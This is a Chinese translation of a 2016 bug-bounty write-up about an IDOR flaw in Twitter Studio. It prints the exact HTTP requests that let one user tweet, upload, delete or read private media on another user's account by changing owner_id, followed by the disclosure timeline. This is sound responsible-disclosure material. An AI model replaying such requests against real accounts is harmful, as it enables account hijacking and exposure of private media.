# 我是如何黑掉所有 Twitter 账户的(以及我是如何获得 5040 美元奖金的)

> 原文：<https://www.freecodecamp.org/news/how-i-hacked-your-twitter-account-tweeting-viewing-deleting-photos-and-other-media-bf2cb3a18818/>

通过 AppSecure

# 我是如何黑掉所有 Twitter 账户的(以及我是如何获得 5040 美元奖金的)

![1*LmBD9OaRAJPnBYBoZwyZMw](img/70566cf8a5038b9c85f8a87f2bd30e78.png)

Photo by [Charles Deluvio ???? on](https://unsplash.com/photos/pjAH2Ax4uWk?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText) Unsp[lash](https://unsplash.com/search/photos/hacker?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText)

### [总结](https://unsplash.com/search/photos/hacker?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText)

[这篇博文是关于 Twitter 上的一个](https://unsplash.com/search/photos/hacker?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText) [不安全直接对象引用](https://www.owasp.org/index.php/Top_10_2013-A4-Insecure_Direct_Object_References)漏洞。攻击者可能会利用此漏洞进行各种活动。例如，他们可以从其他帐户发布推文，代表用户上传视频，从受害者的帐户中删除图片/视频，或查看其他 twitter 帐户上传的私人媒体。studio.twitter.com 的所有端点都很脆弱。

### **描述**

Twitter 是一种在线新闻和社交网络服务，用户可以发布消息并与之互动，称为“tweets”，限制在 140 个字符以内。注册用户可以发布推文，未注册的只能阅读。用户通过 Twitter 的网站界面、短信或移动设备应用程序访问 Twitter。

Twitter 在 2016 年 9 月推出了一款名为 Twitter Studio(studio.twitter.com)的新产品。发布后，我开始寻找安全漏洞。

studio.twitter.com 上的所有 API 请求都发送一个名为“owner_id”的参数，这是登录用户的公开 twitter 用户 id。`Owner_id`参数缺少对更改的授权检查，这允许我代表其他 Twitter 用户采取行动。

#### **易受攻击的请求#1(从其他 Twitter 账户发推文。)**

```
POST /1/tweet.json HTTP/1.1Host: studio.twitter.com
```

```
{“account_id”:”attacker’s account id”,”owner_id”:”victim’s user id”,”metadata”:{“monetize”:false,”embeddable_playback”:false,”title”:”Test tweet by attacker”,“description”:”attacker attacker”,”cta_type”:null,”cta_link”:null},”media_key”:””,“text”:”attacker attacker”}
```

用受害者的 ID 重放上述请求导致了来自受害者帐户的推文。

#### **易受攻击的请求#2(从另一个帐户上传媒体)**

```
POST /1/library/add.json HTTP/1.1Host: studio.twitter.com
```

```
{“account_id”:”attacker’s accountid”,”owner_id”:”victim’s id”,”metadata”:{“monetize”:false,”name”:”abcd.png”,”embeddable_playback”:true,”title”:”Attacker”,”description”:””,”cta_type”:null,”cta_link”:null},”media_id”:””,”managed”:false,”media_type”:”TweetImage”}
```

用受害者从其他用户帐户上传的`owner_id`媒体重放上述请求。

#### **易受攻击请求#3(删除其他帐户的视频)**

```
POST /1/library/remove.json HTTP/1.1Host: studio.twitter.com
```

```
{“account_id”:”attacker’s account id”,”owner_id”:”victim’s id”,”media_key”:”victim’s video id”}
```

使用受害者的用户 id 和受害者的`media_key`从受害者的帐户中删除媒体来重放上述请求。

#### **易受攻击的请求#4(私人媒体披露)**

`GET /1/library/list.json?account_id=attacker’s account id&owner_id=victim’s id&limit=20&offset=0 HTTP/1.1`
`Host: studio.twitter.com`
`User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:37.0) Gecko/20100101 Firefox/37.0`
`Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`
`Accept-Language: en-US,en;q=0.5`
`Accept-Encoding: gzip, deflate`
`Referer: [https://studio.twitter.com/library](https://studio.twitter.com/library)`
`Cookie:`
`Connection: keep-alive`

用受害者的用户 ID 和我的账户 ID 重播上述请求，作为回应泄露了受害者 Twitter 账户的所有私人媒体。

### **视频概念验证**

所有的测试都是在得到朋友的允许后，用他的账户做的。

#### 受害者账户的第一条推文，私人媒体泄露

#### #2 从受害者的推文中删除媒体

### **时间线**

#### 2016 年 8 月 29 日

在 3 份不同的报告中向 Twitter 报告了所有发现，因为终点不同。

#### 2016 年 9 月 2 日

收到 Twitter 团队的回复，称我们正在调查该问题，并将关闭其他重复报告，因为它们有相同的根本原因，即缺少`owner_id`检查。

#### 2016 年 9 月 3 日

Twitter 奖励的赏金**5040 美元**

我是 AppSecure 的创始人，这是一家专业的网络安全公司，拥有多年的经验和细致的专业知识。我们在这里保护您的业务和关键数据免受在线和离线威胁或漏洞。

您可以通过 hello@appsecure.in 与我们联系